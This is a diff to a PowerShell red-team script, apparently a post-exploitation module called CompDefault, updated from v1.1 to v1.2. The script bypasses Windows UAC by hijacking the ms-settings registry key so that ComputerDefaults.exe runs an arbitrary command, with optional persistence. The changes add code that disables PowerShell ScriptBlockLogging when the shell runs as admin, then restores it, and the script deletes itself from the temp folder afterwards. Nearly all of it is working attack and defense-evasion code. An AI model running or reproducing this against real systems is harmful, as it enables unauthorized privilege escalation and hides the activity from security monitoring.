@@ -7,7 +7,7 @@
    EOP Disclosure By: @FabienDROMAS|@404death
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev Version: v1.1
+   PS cmdlet Dev Version: v1.2
 
 .DESCRIPTION
    CompDefault cmdlet uses ComputerDefaults.exe native windows 10 microsoft signed binary that have the
@@ -73,7 +73,7 @@ $EOP_Success = $False          # Remote EOP execution status [<dontchange>]
 $MakeItPersistence = "False"   # Change this value to "True" to make the '$Command' persistence
 $param1 = $args[0]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
 $param2 = $args[1]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
-$host.UI.RawUI.WindowTitle = "@CompDefault v1.1 {SSA@redTeam}"
+$host.UI.RawUI.WindowTitle = "@CompDefault v1.2 {SSA@redTeam}"
 If($param2 -ieq "-Verbose"){$VerboseMode = "True"}
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$Env:WINDIR\System32\cmd.exe"
@@ -88,8 +88,9 @@ If(-not($param1) -or $param1 -eq $null){
 }
 
 ## CompDefault meterpeter post-module banner
-Write-Host "`nCompDefault v1.1 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+Write-Host "`nCompDefault v1.2 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
 Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
+
 
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\ms-settings" -EA SilentlyContinue
@@ -111,10 +112,28 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
       If(Test-Path -Path "HKCU:\Software\Classes\ms-settings\shell\Open\Command" -ErrorAction SilentlyContinue){
          Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null;Start-Sleep -Seconds 1
          Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted." -ForegroundColor Green;Start-Sleep -Milliseconds 400
-         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
+         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command"
+
+         ## Revert ScriptBlockLogging (default)
+         If($CheckAmsiLogging -eq $True){
+            If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
+               Write-Host "[ ] Admin     => Enable AMSI ScriptBlockLogging." -ForeGroundColor Yellow
+               Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
+            }
+         }
+
       }Else{
+
+         ## Revert ScriptBlockLogging (default)
+         If($CheckAmsiLogging -eq $True){
+            If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
+               Write-Host "[ ] Admin     => Enable AMSI ScriptBlockLogging." -ForeGroundColor Yellow
+               Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
+            }
+         }
+
          Write-Host "[ ] Failed    => None CompDefault registry keys found under:" -ForegroundColor Red;Start-Sleep -Milliseconds 400
-         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
+         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command"
       }
       If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
       Exit
@@ -130,7 +149,15 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
       Exit
    }
 
-   ### Add Entrys to Regedit { using powershell }
+   ## Add Entrys to Regedit { using powershell }
+   # disable AMSI ScriptBlockLogging (IF admin shell)
+   $CheckAmsiLogging = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match"S-1-5-32-544")
+   If($CheckAmsiLogging -eq $True){
+      Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Green;Start-Sleep -Milliseconds 400
+      New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force -EA SilentlyContinue|Out-Null
+      Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "0" -Type "DWORD" -Force -EA SilentlyContinue|Out-Null
+   }
+
    Write-Host "[+] Hijacking => ComputerDefaults.exe execution in registry."
    # New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 380
@@ -268,6 +295,13 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    ## Vulnerable registry Hive => NOT FOUND
    Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
    Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\ms-settings'`n" -ForegroundColor red -BackgroundColor Black
+}
+
+## Revert ScriptBlockLogging (default)
+If($CheckAmsiLogging -eq $True){
+   If(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"){
+      Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Recurse -Force -EA SilentlyContinue|Out-Null
+   }
 }
 
 ## Clean old files left behind by CompDefault after the job is finished ..
